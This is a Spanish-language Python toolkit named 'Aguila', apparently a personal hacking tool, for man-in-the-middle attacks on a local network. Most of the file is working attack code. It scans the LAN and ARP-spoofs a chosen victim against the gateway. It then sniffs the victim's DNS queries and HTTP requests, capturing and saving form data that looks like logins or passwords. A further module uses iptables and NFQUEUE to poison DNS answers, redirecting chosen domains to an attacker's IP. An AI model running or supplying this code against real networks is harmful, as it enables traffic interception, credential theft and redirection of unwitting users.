#!/usr/bin/env python3

import logging
import os
import signal
import socket
import sys
import threading
import time
import netifaces as ni
import scapy.all as scapy
from termcolor import colored
from scapy.layers import http
import netfilterqueue # type: ignore
import argparse





class ReturnToMenuException(Exception):
    pass

def salida(sig, frame):
    print(colored("\n\n[!] Saliendo de Aguila...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, salida)


def cabecera():
    print('''
                                        /T /I                     
                                   / |/ | .-~/                
                               T\ Y  I  |/  /  _              
              /T               | \I  |  I  Y.-~/              
             I l   /I       T\ |  |  l  |  T  /               
          T\ |  \ Y l  /T   | \I  l   \ `  l Y                
      __  | \l   \l  \I l __l  l   \   `  _. |                
      \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |                
       \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |                
     .--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./                
      >--.  ~-.   ._  ~>-"    "\\   7   7   ]                 
     ^.___~"--._    ~-{  .-~ .  `\ Y . /    |                 
      <__ ~"-.  ~       /_/   \   \I  Y   : |                 
        ^-.__           ~(_/   \   >._:   | l______           
            ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.       
                   (_/ .  ~(   /'     "~"--,Y   -=b-. _)      
                    (_/ .  \  :           / l      c"~o \     
                     \ /    `.    .     .^   \_.-~"~--.  )    
                      (_/ .   `  /     /       !       )/     
                       / / _.   '.   .':      /        '      
                       ~(_/ .   /    _  `  .-<_               
                         /_/ . ' .-~" `.  / \  \          ,z=.
                         ~( /   '  :   | K   "-.~-.______//   
                           "-,.    l   I/ \_    __{--->._(==. 
                            //(     \  <    ~"~"     //       
                           /' /\     \  \     ,v=.  ((        
                         .^. / /\     "  }__ //===-  `        
                        / / ' '  "-.,__ {---(==-              
                      .^ '       :  T  ~"   ll     -By M4nu       
                     / .  .  . : | :!        \\               
                    (_/  /   | | j-"          ~^              
                      ~-<_(_.^-~"                              
    ''')



# -----------------------AGUILA-HTTPS----------------------------------

def configuracion_proxy():
    os.system('clear')
    print('''
     _____              __ _       _____                     
    / ____|            / _(_)     |  __ \                    
    | |     ___  _ __ | |_ _  __ _| |__) | __ _____  ___   _ 
    | |    / _ \| '_ \|  _| |/ _` |  ___/ '__/ _ \ \/ / | | |
    | |___| (_) | | | | | | | (_| | |   | | | (_) >  <| |_| |
     \_____\___/|_| |_|_| |_|\__, |_|   |_|  \___/_/\_\\__,  |
                             __/ |                      __/ |
                            |___/                      |___/ 
          

Visita la página de la documentaciñon de proxy para saber como se configura: https://m4nutcp.github.io/Documentacion-Aguila/

    ''')
    input("Presiona Enter para regresar...")

def iniciar_aguila_https():
    os.system('./mitmdump -s AguilaHttps.py --quiet')


def aguila_dominios_https():

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # para que no salga los mensajes de error

    # Global set for seen domains
    dominios_vistos = set()

    def cabecera_aguia_dominio_https():
        print('''
                      _ _              _____                  _       _             _    _ _   _             
     /\              (_) |            |  __ \                (_)     (_)           | |  | | | | |            
    /  \   __ _ _   _ _| | __ _ ______| |  | | ___  _ __ ___  _ _ __  _  ___ ______| |__| | |_| |_ _ __  ___ 
   / /\ \ / _` | | | | | |/ _` |______| |  | |/ _ \| '_ ` _ \| | '_ \| |/ _ \______|  __  | __| __| '_ \/ __|
  / ____ \ (_| | |_| | | | (_| |      | |__| | (_) | | | | | | | | | | | (_) |     | |  | | |_| |_| |_) \__ /
 /_/    \_\__, |\__,_|_|_|\__,_|      |_____/ \___/|_| |_| |_|_|_| |_|_|\___/      |_|  |_|\__|\__| .__/|___/
           __/ |                                                                                  | |        
          |___/                                                                                   |_|        
        ''')

    def scannerARP():

        def scan(ip):
            answered_list, _ = scapy.arping(ip, verbose=0)  
            print("\n IP Address\t   MAC Address\t\tHostname")
            print("--------------------------------------------------")
            for sent, received in answered_list:
                try:
                    # Intenta resolver el hostname a partir de la dirección IP
                    hostname = socket.gethostbyaddr(received.psrc)[0]
                except socket.herror:
                    # Si no puede resolver el hostname, muestra "Unknown"
                    hostname = "Unknown"
                print(f"{received.psrc}\t{received.hwsrc}\t{hostname}")

        def main():
            target = input("\nTrama para scanear: ")
            scan(target)

        main()

    def get_my_mac(interface):
        try:
            return ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']
        except ValueError:
            print(colored(f"\n[!] La interfaz {interface} no es válida o no está disponible.\n", "red"))
            return None
        except KeyError:
            print(colored(f"\n[!] No se pudo obtener la MAC para la interfaz {interface}. Asegúrate de que está activa.\n", "red"))
            return None

    def spoof(target_ip, gateway_ip, my_mac, victim_mac):
        while True:
            try:
                scapy.send(scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=victim_mac, hwsrc=my_mac), verbose=False)
                scapy.send(scapy.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=my_mac), verbose=False)
                time.sleep(2)
            except KeyboardInterrupt:
                print(colored("\n[!] Terminando el programa...", "red"))
                break
            except Exception as e:
                print(colored(f"\n[!] Error durante el spoofing: {e}\nIntentando continuar...", "red"))
                continue

    def process_dns_packet(packet):
        if packet.haslayer(scapy.DNSQR):
            dominio = packet[scapy.DNSQR].qname.decode()
            exclusion_palabras = ["google", "cloud", "bing", "static", "beacons", "fontawesome", "protechts", "video-weaver", "pdx01", "cookiebot", "dof6", "geolocation", "public", "img", "w3", "goog", "delivery", "events", "microsoft", "browser", "ajax" ]
            if dominio not in dominios_vistos and not any(palabra in dominio for palabra in exclusion_palabras):
                dominios_vistos.add(dominio)
                print(f"[+] Dominio: {dominio}")

    def sniff_dns(interface):
        print(colored(f"\n[+] Interceptando paquetes DNS de la máquina víctima:\n", "light_magenta"))
        scapy.sniff(iface=interface, filter="udp and port 53", prn=process_dns_packet, store=0)

    def signal_handler(sig, frame):
        exit(0)

    def main():
        os.system('clear')
        cabecera_aguia_dominio_https()
        scannerARP()
        target_ip = input("\nIP máquina víctima: ")
        victim_mac = input('Mac de la máquina víctima: ')

        while True:
            my_interface = input('¿En qué interfaz de red estás? ')
            my_mac = get_my_mac(my_interface)
            if my_mac is not None:
                break  # Sale del bucle si la MAC es válida
            else:
                print("[!] Introduce una interfaz válida.\n")
        
        # Start ARP spoofing in a separate thread
        threading.Thread(target=spoof, args=(target_ip, "192.168.1.1", my_mac, victim_mac), daemon=True).start()
        
        # Start DNS sniffing in a separate thread
        sniff_dns(my_interface)
        signal.signal(signal.SIGINT, signal_handler)


    if __name__ == '__main__':
        main()



# ---------------------------Aguila-https-Arriba------------------------------------------


# ---------------------------Dominios-http------------------------------------------------

def aguila_http():
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    os.system('sudo iptables --policy FORWARD ACCEPT')
    os.system('sudo echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null 2>&1')

    # Global set for seen domains
    dominios_vistos = set()
    captured_data = []  # Para almacenar los datos capturados

    def cabecera_http():
        print('''
                      _ _              _    _ _   _         
     /\              (_) |            | |  | | | | |        
    /  \   __ _ _   _ _| | __ _ ______| |__| | |_| |_ _ __  
   / /\ \ / _` | | | | | |/ _` |______|  __  | __| __| '_ \ 
  / ____ \ (_| | |_| | | | (_| |      | |  | | |_| |_| |_) |
 /_/    \_\__, |\__,_|_|_|\__,_|      |_|  |_|\__|\__| .__/ 
           __/ |                                     | |    
          |___/                                      |_|    
    ''')

    def scannerARP():
        def scan(ip):
            answered_list, _ = scapy.arping(ip, verbose=0)  
            print("\n IP Address\t   MAC Address\t\tHostname")
            print("--------------------------------------------------")
            for sent, received in answered_list:
                try:
                    hostname = socket.gethostbyaddr(received.psrc)[0]
                except socket.herror:
                    hostname = "Unknown"
                print(f"{received.psrc}\t{received.hwsrc}\t{hostname}")

        target = input("\nTrama para scanear: ")
        scan(target)

    def get_my_mac(interface):
        try:
            return ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']
        except ValueError:
            print(colored(f"\n[!] La interfaz {interface} no es válida o no está disponible.\n", "red"))
            return None
        except KeyError:
            print(colored(f"\n[!] No se pudo obtener la MAC para la interfaz {interface}. Asegúrate de que está activa.\n", "red"))
            return None

    def spoof(target_ip, gateway_ip, my_mac, victim_mac):
        while True:
            try:
                scapy.send(scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=victim_mac, hwsrc=my_mac), verbose=False)
                scapy.send(scapy.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=my_mac), verbose=False)
                time.sleep(2)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(colored(f"\n[!] Error durante el spoofing: {e}", "red"))
                continue

    def process_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
            print(f"\n[+] Url visitada: {url}")
            captured_data.append(f"URL visitada: {url}")

            if packet.haslayer(scapy.Raw):
                response = packet[scapy.Raw].load.decode()
                cred_keywords = ["login", "user", "pass", "@", "mail"]
                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(colored(f"\n[+] Posibles Credenciales: {response}", "light_magenta")))
                        captured_data.append(f"Posibles Credenciales: {response}")
                        break

    def sniff_traffic(interface):
        print(colored(f"\n[+] Interceptando paquetes de la máquina víctima:\n", "light_magenta"))
        scapy.sniff(iface=interface, filter="udp and port 53 or port 80 or port 443", prn=process_packet, store=0)

    def signal_handler(sig, frame):
        print(colored("\n[!] Saliendo de Aguila...\n", "red"))
        if input("¿Deseas guardar la información capturada en un archivo? (s/n): ").lower() == 's':
            with open("Aguila-http-Demonio.txt", "w") as f:
                for item in captured_data:
                    f.write(item + "\n")
            print("Datos guardados en 'Aguila-http-Demonio.txt'.")
        else:
            print("No se guardaron los datos.")
        exit(0)

    def main():
        try:
            os.system('clear')
            cabecera_http()
            scannerARP()
            target_ip = input("\nIP máquina víctima: ")
            victim_mac = input('Mac de la máquina víctima: ')

            while True:
                my_interface = input('¿En qué interfaz de red estás? ')
                my_mac = get_my_mac(my_interface)
                if my_mac is not None:
                    break
                print("[!] Introduce una interfaz válida.\n")
            
            threading.Thread(target=spoof, args=(target_ip, "192.168.1.1", my_mac, victim_mac), daemon=True).start()
            sniff_traffic(my_interface)
        except RuntimeError:
            print(colored("[+] Saliendo de Aguila...", "red"))


    # Configura el manejador de señal
    signal.signal(signal.SIGINT, signal_handler)

    main()


# ------------------------Dominios-http-Arriba-----------------------------

# ------------------------Aguila-Infection---------------------------------

def Aguila_arp_spoof():

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # para que no salga los mensajes de error

    def get_my_mac(interface):
        # Recoge la mac de la de la máquina local
        try:
            return ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']
        except ValueError:
            print(f"\n[!] La interfaz {interface} no es válida o no está disponible.\n")
            return None
        except KeyError:
            print(f"\n[!] No se pudo obtener la MAC para la interfaz {interface}. Asegúrate de que está activa.\n")
            return None

    def scannerARP():

        def scan(ip):
            answered_list, _ = scapy.arping(ip, verbose=0)  
            print("\n IP Address\t   MAC Address\t\tHostname")
            print("--------------------------------------------------")
            for sent, received in answered_list:
                try:
                    # Intenta resolver el hostname a partir de la dirección IP
                    hostname = socket.gethostbyaddr(received.psrc)[0]
                except socket.herror:
                    # Si no puede resolver el hostname, muestra "Unknown"
                    hostname = "Unknown"
                print(f"{received.psrc}\t{received.hwsrc}\t{hostname}")

        def main():
            target = input("\nTrama para scanear: ")
            scan(target)

        main()

    def spoof(ip_addres, spoof_ip,my_mac, victim_mac):
        arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_addres, hwdst=victim_mac, hwsrc=my_mac)
        scapy.send(arp_packet, verbose=False)

    def main():
        scannerARP()
        target = input("\nIP máquina víctima: ")
        victim_mac = input('Mac de la máquina víctima: ')

        while True:
            my_interface = input('¿En qué interfaz de red estás? ')
            my_mac = get_my_mac(my_interface)

            print(colored("\n[+] Aguila ha comprometido la máquina víctima. Ejecuta Aguila-dns-spoof en otra terminal para envenenar los dominios. Consulta la documentación si es necesario: https://m4nutcp.github.io/Documentacion-Aguila/", "light_magenta"))

            if my_mac is not None:
                break  # Sale del bucle si la MAC es válida
            else:
                print("\n[!] Introduce una interfaz válida.\n")
        while True:
            try:
                spoof(target, "192.168.1.1", my_mac, victim_mac)
                spoof("192.168.1.1", target, my_mac, victim_mac)
                time.sleep(2)
            except KeyboardInterrupt:
                print("\n[!] Terminando el programa...")
                break
            except Exception as e:
                print(f"\n[!] Error durante el spoofing: {e}\nIntentando continuar...")
                continue



    if __name__ == '__main__':
        main()

def cabecera_Aguila_dns_spoofer():
    print('''
                      _ _              _____  _   _  _____       _____                    __          
     /\              (_) |            |  __ \| \ | |/ ____|     / ____|                  / _|         
    /  \   __ _ _   _ _| | __ _ ______| |  | |  \| | (___ _____| (___  _ __   ___   ___ | |_ ___ _ __ 
   / /\ \ / _` | | | | | |/ _` |______| |  | | . ` |\___ \______\___ \| '_ \ / _ \ / _ \|  _/ _ \ '__|
  / ____ \ (_| | |_| | | | (_| |      | |__| | |\  |____) |     ____) | |_) | (_) | (_) | ||  __/ |   
 /_/    \_\__, |\__,_|_|_|\__,_|      |_____/|_| \_|_____/     |_____/| .__/ \___/ \___/|_| \___|_|   
           __/ |                                                      | |                             
          |___/                                                       |_|                             
    ''')

def Aguila_dns_spoofer():
    os.system('clear')
    cabecera_Aguila_dns_spoofer()
    def def_handler(sig, frame):
        print("\n[!] Saliendo...\n")
        remove_iptables_rules()
        sys.exit(1)

    def init_iptables():
        respuesta = input("Vamos a modificar las iptables, ¿desea continuar? (s/n): ").lower()
        if respuesta == 's':
            print("\n[+] Configurando reglas de iptables...")
            os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num 0")
            os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0")
            os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")
            os.system("sudo iptables --policy FORWARD ACCEPT")

    def remove_iptables_rules():
        print("\n[+] Limpiando reglas de iptables...")
        os.system("sudo iptables -D INPUT -j NFQUEUE --queue-num 0")
        os.system("sudo iptables -D OUTPUT -j NFQUEUE --queue-num 0")
        os.system("sudo iptables -D FORWARD -j NFQUEUE --queue-num 0")

    def get_domains_to_spoof():
        num_domains = int(input("¿Cuántos dominios desea envenenar? "))
        domains = []
        for i in range(num_domains):
            domain = input(f"Ingrese el dominio #{i+1}: ")
            domains.append(domain.encode())
        return domains

    def process_packet(packet, domains, attacker_ip):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR) and scapy_packet.haslayer(scapy.DNSQR):
            qname = scapy_packet[scapy.DNSQR].qname
            for domain in domains:
                if domain in qname:
                    print(colored(f"\n[+] Envenenando el dominio {domain.decode()}", "red"))
                    answer = scapy.DNSRR(rrname=qname, rdata=attacker_ip)
                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1

                    # Solo elimina los campos si el paquete es IP/UDP
                    if scapy_packet.haslayer(scapy.UDP):
                        del scapy_packet[scapy.IP].len
                        del scapy_packet[scapy.IP].chksum
                        del scapy_packet[scapy.UDP].len
                        del scapy_packet[scapy.UDP].chksum

                    packet.set_payload(scapy_packet.build())
                    break
        packet.accept()



    if __name__ == "__main__":
        signal.signal(signal.SIGINT, def_handler)
        init_iptables()
        attacker_ip = input("\nIngrese la IP del atacante: ")
        domains_to_spoof = get_domains_to_spoof()
        print(colored(f"\n[+] Iniciando envenenamiento:", "light_magenta"))
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, lambda packet: process_packet(packet, domains_to_spoof, attacker_ip))
        try:
            queue.run()
        except KeyboardInterrupt:
            remove_iptables_rules()
            sys.exit(1)

# -------------------HELP-------------------------------------------------------------------------

    

# -------------------MENUS-------------------------------------------------------------------------

def mostrar_submenu_aguila_infection():
    os.system('clear')
    cabecera()
    print("\n Se recomienda leer la documentación para hacer uso de Aguila-Infection: https://m4nutcp.github.io/Documentacion-Aguila/")
    print("\n1. Iniciar Aguila-arp-spoof")
    print("2. Iniciar Aguila-dns-spoofer")
    print("3. Volver")
    return input("\n-> ")


def mostrar_submenu_aguila_https():
    os.system('clear')
    cabecera()
    print("Documentación: https://m4nutcp.github.io/Documentacion-Aguila/")
    print("\n1. Aguila-Https (Se necesita proxy)")
    print("2. Aguila-Dominios-Https")
    print("3. Configuración proxy")
    print("4. Volver")
    return input("\n-> ")

def mostrar_menu_principal():
    os.system('clear')
    cabecera()
    print("\n1. Aguila-Https")
    print("2. Aguila-Http")
    print("3. Aguila-Infection")
    print("4. Salir")
    return input("\n-> ")

def main():
    while True:
        try:
            opcion = mostrar_menu_principal()
            if opcion == '1':
                while True:
                    subopcion = mostrar_submenu_aguila_https()
                    if subopcion == '1':
                        iniciar_aguila_https()
                    elif subopcion == '2':
                        aguila_dominios_https()
                    elif subopcion == '3':
                        configuracion_proxy()
                    elif subopcion == '4':
                        break
                    else:
                        print("Opción no válida.")
            elif opcion == '2':
                aguila_http()
            elif opcion == '3':
                while True:
                    subopcion = mostrar_submenu_aguila_infection()
                    if subopcion == '1':
                        Aguila_arp_spoof()
                    elif subopcion == '2':
                        Aguila_dns_spoofer()
                    elif subopcion == '3':
                        break
                    else:
                        print("Opción no válida.")
            elif opcion == '4':
                print(colored("\n\n[!] Saliendo de Aguila...", "red"))
                break
            else:
                print("Opción no válida.")
        except ReturnToMenuException:
            continue
   


if __name__ == '__main__':
    main()


